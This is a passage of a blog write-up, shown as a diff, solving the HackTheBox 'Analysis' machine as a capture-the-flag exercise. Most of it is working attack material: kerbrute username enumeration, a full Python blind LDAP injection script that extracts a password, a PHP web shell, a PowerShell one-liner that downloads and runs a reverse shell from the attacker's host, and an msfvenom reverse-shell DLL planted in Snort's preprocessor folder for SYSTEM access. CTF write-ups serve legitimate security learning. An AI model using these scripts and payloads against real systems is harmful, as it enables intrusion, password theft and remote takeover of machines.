+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt possible-usernames.txt | <span class="nb">sed</span> <span class="s2">"s|</span><span class="nv">$|</span><span class="s2">@analysis.htb|"</span> <span class="o">&gt;</span> emails-wl.txt
+</code></pre></div></div>
+
+<p>Now, we run kerbrute:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>kerbrute userenum <span class="nt">-d</span> analysis.htb emails-wl.txt <span class="nt">--dc</span> analysis.htb
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/22/24 - Ronnie Flathers @ropnop
+
+2024/01/22 20:37:53 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/01/22 20:37:53 <span class="o">&gt;</span>   analysis.htb:88
+
+2024/01/22 20:39:23 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       jdoe@analysis.htb
+2024/01/22 20:40:45 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       ajohnson@analysis.htb
+2024/01/22 20:43:40 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       cwilliams@analysis.htb
+2024/01/22 20:45:00 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       wsmith@analysis.htb
+2024/01/22 20:49:41 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       jangel@analysis.htb
+2024/01/22 21:10:10 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       technician@analysis.htb
+2024/01/22 21:28:24 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       JDoe@analysis.htb
+2024/01/22 21:29:38 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       AJohnson@analysis.htb
+2024/01/22 22:50:34 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       badam@analysis.htb
+
+</code></pre></div></div>
+
+<p>As we can see, there are a bunch of valid usernames. Let’s go back to the <code class="language-plaintext highlighter-rouge">/Users</code> endpoint and pass these usernames (without the mail part <code class="language-plaintext highlighter-rouge">@analysis.htb</code>) and see if we can retrieve someone’s password. After a bunch of attempts, we see that the name <code class="language-plaintext highlighter-rouge">technician</code> under the email <code class="language-plaintext highlighter-rouge">technician@analysis.htb</code> gives a different response:</p>
+
+<p><img src="../figs/analysis05.png" alt="valid user" /></p>
+
+<p>However, nothing too much interesting shows up here. We could try to brute the password using kerbrute, but I’ve tried it with huge wordlists and nothing was found. There must be another way to get this user’s password…</p>
+
+<p>I’ve tried to send SQL injection payloads, but without success. Then, after a long time of researching, I’ve found (and learned) this new injection technique: LDAP injections. Some web applications serve as bridges to LDAP service, and they can also be prone to injection! I came across <a href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt">this</a> wordlist, which contained different kinds of payloads. The first one, a simple asterisk <code class="language-plaintext highlighter-rouge">*</code>, showed that the <code class="language-plaintext highlighter-rouge">name</code> parameter was indeed used to query LDAP:</p>
+
+<p><img src="../figs/analysis1.png" alt="ldap injection test" /></p>
+
+<p>After a bit more research, I found that the payload <code class="language-plaintext highlighter-rouge">name=&lt;username&gt;)(%26(objectClass=user)(description=*)</code> can be used to enumerate the possible characters of the user’s password. All we need to do is pass characters at <code class="language-plaintext highlighter-rouge">(description=&lt;pwd-char&gt;*)</code>. If the character is a correct guess, then the page would return the same as if we pass <code class="language-plaintext highlighter-rouge">name=&lt;username&gt;</code> alone. This is a blind LDAP injection attack, as we have to guess without actually having the password to be printed out for us in the body of the page.</p>
+
+<p>As an example, let’s see the following response for the payload <code class="language-plaintext highlighter-rouge">name=technician)(%26(objectClass=user)(description=9*)</code> against <code class="language-plaintext highlighter-rouge">name=technician)(%26(objectClass=user)(description=7*)</code>.</p>
+
+<p><img src="../figs/analysis07.png" alt="invalid payload" /></p>
+
+<p><img src="../figs/analysis06.png" alt="valid payload" /></p>
+
+<p>As we can see, because we got a response back with the First Name field containing <code class="language-plaintext highlighter-rouge">technician</code> when we passed the 9 instead of 7, we conclude that the number 9 is the first character of the <code class="language-plaintext highlighter-rouge">technician</code> user!</p>
+
+<p>Alright, let’s automate the character testing process using a Python script. However, there’s a catch: the asterisk character <code class="language-plaintext highlighter-rouge">*</code> holds a special meaning in LDAP queries, representing a wildcard. This presents a challenge if the character is part of the password, as our query may not interpret it correctly. For instance, if the password is <code class="language-plaintext highlighter-rouge">abc\*123\*!@#</code>, our script can correctly guess up to abc, but it will struggle to identify the * due to its special significance in LDAP. To address this, the script operates in rounds. It tests characters sequentially until it exhausts its list. If it can’t progress further, the script attempts a login, assuming the next character might be an asterisk. If the login fails, it confirms the presence of a * and proceeds to the next round. This process repeats until the script successfully deduces the entire password. The script is available <a href="https://github.com/alexbsec/analysis-htb/blob/master/ldapinject.py">here</a>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">urllib.parse</span>
+<span class="kn">import</span> <span class="n">string</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="k">def</span> <span class="nf">try_login</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span><span class="n">email</span><span class="p">,</span>
+        <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">unquote_plus</span><span class="p">(</span><span class="n">password</span><span class="p">),</span>
+        <span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">Login</span><span class="sh">'</span>
+    <span class="p">}</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="sh">"</span><span class="s">Wrong Data</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">test_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">found_chars</span><span class="p">):</span>
+    <span class="n">modified_url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">{FUZZ}</span><span class="sh">"</span><span class="p">,</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">quote_plus</span><span class="p">(</span><span class="n">char</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">{found_char}</span><span class="sh">"</span><span class="p">,</span> <span class="n">found_chars</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Testing </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s"> for URL: </span><span class="si">{</span><span class="n">modified_url</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">modified_url</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">technician</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Request failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">do_loop</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">wl</span><span class="p">,</span> <span class="n">found_chars</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">wl</span><span class="p">:</span>
+        <span class="n">char</span> <span class="o">=</span> <span class="n">char</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+        <span class="k">if</span> <span class="nf">test_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">found_chars</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Found char: </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s">. Resetting iteration</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">found_chars</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="k">return</span> <span class="nf">do_loop</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">wl</span><span class="p">,</span> <span class="n">found_chars</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">found_chars</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://internal.analysis.htb/Users/list.php</span><span class="sh">"</span>
+    <span class="n">login_url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://internal.analysis.htb/employees/login.php</span><span class="sh">"</span>
+    <span class="n">email</span> <span class="o">=</span> <span class="sh">"</span><span class="s">technician@analysis.htb</span><span class="sh">"</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="n">max_rounds</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">How many rounds? </span><span class="sh">"</span><span class="p">))</span>
+
+    <span class="n">wl</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">!@#$%^&amp;*()_+=-</span><span class="sh">"</span>
+    <span class="n">param</span> <span class="o">=</span> <span class="sh">"</span><span class="s">?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)</span><span class="sh">"</span>
+    <span class="n">base_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">param</span>
+    
+    <span class="n">rounds</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">while</span> <span class="n">rounds</span> <span class="o">&lt;=</span> <span class="n">max_rounds</span><span class="p">:</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="nf">do_loop</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">wl</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Round </span><span class="si">{</span><span class="n">rounds</span><span class="si">}</span><span class="s"> password is: </span><span class="sh">'</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">'</span><span class="s">. Attempting login...</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">can_login</span> <span class="o">=</span> <span class="nf">try_login</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">can_login</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Login successful!</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] Round </span><span class="si">{</span><span class="n">rounds</span><span class="si">}</span><span class="s"> login attempt failed with password </span><span class="sh">'</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Starting round </span><span class="si">{</span><span class="n">rounds</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s"> assuming next character in password is </span><span class="sh">'</span><span class="s">*</span><span class="sh">'"</span><span class="p">)</span>
+        <span class="n">rounds</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">password</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">%2A</span><span class="sh">"</span>
+    
+
+    <span class="n">password</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">unquote_plus</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Password is: </span><span class="sh">'</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="mi">0</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="n">status</span> <span class="o">=</span> <span class="nf">main</span><span class="p">()</span>
+    <span class="nf">exit</span><span class="p">(</span><span class="n">status</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Here’s the output:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python ldapinject.py
+How many rounds? 2
+<span class="o">[</span>...snip...]
+Testing @ <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%40<span class="k">*</span><span class="o">)</span>
+Testing <span class="c"># for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%23*)</span>
+Testing <span class="nv">$ </span><span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%24<span class="k">*</span><span class="o">)</span>
+Testing % <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%25<span class="k">*</span><span class="o">)</span>
+Testing ^ <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%5E<span class="k">*</span><span class="o">)</span>
+Testing &amp; <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%26<span class="k">*</span><span class="o">)</span>
+Testing <span class="k">*</span> <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%2A<span class="k">*</span><span class="o">)</span>
+Testing <span class="o">(</span> <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%28<span class="k">*</span><span class="o">)</span>
+Testing <span class="o">)</span> <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%29<span class="k">*</span><span class="o">)</span>
+Testing _ <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv_<span class="k">*</span><span class="o">)</span>
+Testing + <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%2B<span class="k">*</span><span class="o">)</span>
+Testing <span class="o">=</span> <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv%3D<span class="k">*</span><span class="o">)</span>
+Testing - <span class="k">for </span>URL: http://internal.analysis.htb/Users/list.php?name<span class="o">=</span><span class="k">*</span><span class="o">)(</span>%26<span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>user<span class="o">)(</span><span class="nv">description</span><span class="o">=</span>97NTtl%2A4QP96Bv-<span class="k">*</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Round 2 password is: <span class="s1">'&lt;redacted&gt;'</span><span class="nb">.</span> Attempting login...
+<span class="o">[</span>+] Login successful!
+<span class="o">[</span>+] Password is: <span class="s1">'&lt;redacted&gt;'</span>
+</code></pre></div></div>
+
+<p>With the password at our disposal, we can log into the admin interface:</p>
+
+<p><img src="../figs/analysis08.png" alt="admin interface" /></p>
+
+<h2 id="step-2---getting-foothold"><a href="#step3-foothold"></a>Step 2 - Getting foothold</h2>
+
+<p>Poking around a little bit, we find an upload funcionality at <code class="language-plaintext highlighter-rouge">/dashboard/form.php</code>. Since the website seems to be rendering PHP, let’s upload a PHP script containing the following:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s1">'&lt;h1&gt;hi mom&lt;/h1&gt;'</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><img src="../figs/analysis09.png" alt="first upload response" /></p>
+
+<p>As we can see from the response, the file was uploaded. Now, we need to find the endpoint where the uploads are stored. Let’s use <code class="language-plaintext highlighter-rouge">ffuf</code> to find it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$ </span>ffuf <span class="nt">-u</span> http://internal.analysis.htb/dashboard/FUZZ <span class="nt">-w</span> usr/share/wordlists/dirbuster/directory-list-1.0.txt <span class="nt">-s</span>
+img
+uploads
+</code></pre></div></div>
+
+<p>As we can see, it is located at <code class="language-plaintext highlighter-rouge">/dashboard/uploads</code>. Accessing the page under the name of the file we uploaded:</p>
+
+<p><img src="../figs/analysis10.png" alt="uploaded php page" /></p>
+
+<p>Since this is a Windows machine, let’s first upload a webshell and get a reverse shell from it. For that, we will use the following PHP script:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">name=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"TEXT"</span> <span class="na">name=</span><span class="s">"cmd"</span> <span class="na">autofocus</span> <span class="na">id=</span><span class="s">"cmd"</span> <span class="na">size=</span><span class="s">"80"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"SUBMIT"</span> <span class="na">value=</span><span class="s">"Execute"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;pre&gt;</span>
+<span class="cp">&lt;?php</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/pre&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>After uploading it under the name of concha.php and accessing it, we find the following page:</p>
+
+<p><img src="../figs/analysis11.png" alt="web-shell" /></p>
+
+<p>We can test our web-shell by sending the command <code class="language-plaintext highlighter-rouge">whoami</code>:</p>
+
+<p><img src="../figs/analysis12.png" alt="whoami in webshell" /></p>
+
+<p>Ok, now we need a one-liner reverse shell to feed this form field. First, we will download <a href="https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1">this</a> PowerShell reverse shell code on our local machine and save it under <code class="language-plaintext highlighter-rouge">shell-payload.ps1</code>. Change everything necessary there, such as your IP address and port. Now we open a Python server where we saved the payload with</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 2323
+</code></pre></div></div>
+
+<p>Finally, we use this powershell command as promp to our web-shell: <code class="language-plaintext highlighter-rouge">powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;your-ip&gt;:2323/shell-payload.ps1')"</code>. Before running it, we open a new netcat listener on the port we passed in the payload <code class="language-plaintext highlighter-rouge">shell-payload.ps1</code>.</p>
+
+<p><img src="../figs/analysis13.png" alt="rev-shell" /></p>
+
+<p>And we get the reverse shell as the web service account!</p>
+
+<h2 id="step-3---system-enumeration"><a href="#step3-crafting-the-attack"></a>Step 3 - System enumeration</h2>
+
+<p>Let’s upload PrivescCheck.ps1 (you can find it <a href="https://github.com/itm4n/PrivescCheck">here</a>) using the upload functionality within the website. Then, we can simply run it inside the shell by typing in <code class="language-plaintext highlighter-rouge">. .\PrivescCheck.ps1; Invoke-PrivescCheck</code>. We will then find a pair of credentials that can be used to log in as a user <code class="language-plaintext highlighter-rouge">jdoe</code>:</p>
+
+<p><img src="../figs/analysis14.png" alt="creds" /></p>
+
+<p>Let’s use Evil-WinRM to connect with this user and spawn a more stable shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.129.223.1 <span class="nt">-u</span> jdoe <span class="nt">-p</span> &lt;redacted&gt;
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>doe<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>analysis<span class="se">\j</span>doe
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>doe<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>doe<span class="se">\D</span>esktop&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\j</span>doe<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>        1/23/2024  10:33 PM             34 user.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>doe<span class="se">\D</span>esktop&gt; <span class="nb">cat </span>user.txt
+71d78169aa06bb5f7d5b1e6fd7babd81
+</code></pre></div></div>
+
+<p>Now that we are inside, let’s take a look again at the <code class="language-plaintext highlighter-rouge">PrivescCheck.ps1</code>. After some greps here and there, I’ve found these lines:</p>
+
+<p><img src="../figs/analysis15.png" alt="snort svc" /></p>
+
+<p>After some research, I’ve found <a href="https://www.cvedetails.com/cve/CVE-2016-1417/">this</a> CVE about dll hijack. In this exploit an attacker would place arbitrary code under tcapi.dll and run <code class="language-plaintext highlighter-rouge">snort.exe</code> to open any pcap file. Unfortunately, that did not work. I had to dig a little deeper…</p>
+
+<p>During my research, I found <a href="https://www.spencerdrayton.co.uk/blog/snort-custom-dynamic-preprocessor/">this</a> reference saying snort uses dynamic preprocessors for various network traffic analysis tasks. These preprocessors are dynamically loaded at runtime from the snort_dynamicpreprocessor directory.</p>
+
+<p>This mechanism of dynamically loading preprocessors provides significant flexibility. But, there’s a catch. Since Snort will load these preprocessors without much questioning, someone could sneak in a bad preprocessor – kind of like a rogue app – into the folder where Snort looks for them. This folder is located at <code class="language-plaintext highlighter-rouge">C:\Snort\lib\snort_dynamicpreprocessor</code>.</p>
+
+<h2 id="-step-4---privilege-escalation"><a href="#solving"></a> Step 4 - Privilege escalation</h2>
+<p>With that in mind, let’s create a reverse shell with <code class="language-plaintext highlighter-rouge">msfvenom</code> to create a malicious dll and upload it to the dynamic preprocessor:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.153 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> dll <span class="nt">-o</span> sf_shell.dll
+</code></pre></div></div>
+
+<p>Now, we open our netcat on port 4444 and download this dll from the <code class="language-plaintext highlighter-rouge">jdoe</code> user shell we have access to with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-WebRequest <span class="nt">-Uri</span> <span class="s2">"http://10.10.14.153:1234/sf_shell.dll"</span> <span class="nt">-OutFile</span> <span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\j</span><span class="s2">doe</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\s</span><span class="s2">f_shell.dll"</span>
+</code></pre></div></div>
+
+<p>Don’t forget to start a Python server on port 1234 in the directory containing the dll shell. After that, we run the following command on <code class="language-plaintext highlighter-rouge">jdoe</code> shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload sf_shell.dll c:<span class="se">\s</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor
+</code></pre></div></div>
+
+<p>And then we wait…</p>
+
+<p><img src="../figs/analysis17.png" alt="root shell" /></p>
+
+<p>And we got root!</p>
+
+<h1 id="conclusion"><a href="#conclusions"></a>Conclusion</h1>
+
+<p>In this CTF, we learned a lot more about LDAP injection techniques and Snort. We were able to retrieve sensitive information using <code class="language-plaintext highlighter-rouge">kerbrute</code> by first gathering possible and valid emails. After that, with LDAP injection, we were able to guess the user’s password and log into the administrator panel. From there, we escalated our privileges using a web shell, granting us access as the web service. For lateral movement, we used PrivescCheck.ps1 and found leaked credentials.</p>
+
+<p>After successfully logging in the leaked user credentials’ account, we escalated privileges by uploading a maliciously crafted dll into the snort dynamic preprocessor’s directory, which then spawned us the root shell.</p>
+
+<p>It was nice ride, for sure!</p>
+
+<p>I hope you liked this write-up and learned something new. As always, don’t forget to do your <strong>research!</strong></p>
+
+<p><a href="/">Go back</a></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alex Buschinelli</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
